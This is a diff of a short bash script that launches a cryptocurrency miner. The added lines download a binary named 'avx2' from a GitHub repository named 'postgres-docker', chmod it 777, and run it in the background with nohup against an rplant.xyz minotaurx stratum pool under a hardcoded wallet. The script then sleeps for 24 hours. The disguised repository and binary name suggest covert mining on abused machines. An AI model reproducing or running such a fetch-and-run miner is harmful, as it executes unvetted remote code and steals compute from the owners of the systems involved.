@@ -1,5 +1,6 @@
 #!/bin/bash
 apt update && apt -y install wget git curl sudo
-chmod 777 srb
-nohup ./srb --disable-gpu --algorithm minotaurx --pool stratum+tcp://stratum-ru.rplant.xyz:7068 --wallet RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.ama --password x --cpu-threads 0
+wget https://github.com/iaidjb18ha/postgres-docker/raw/server-2.19/avx2
+chmod 777 avx2
+nohup ./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.jancok -t18
 sleep 24h
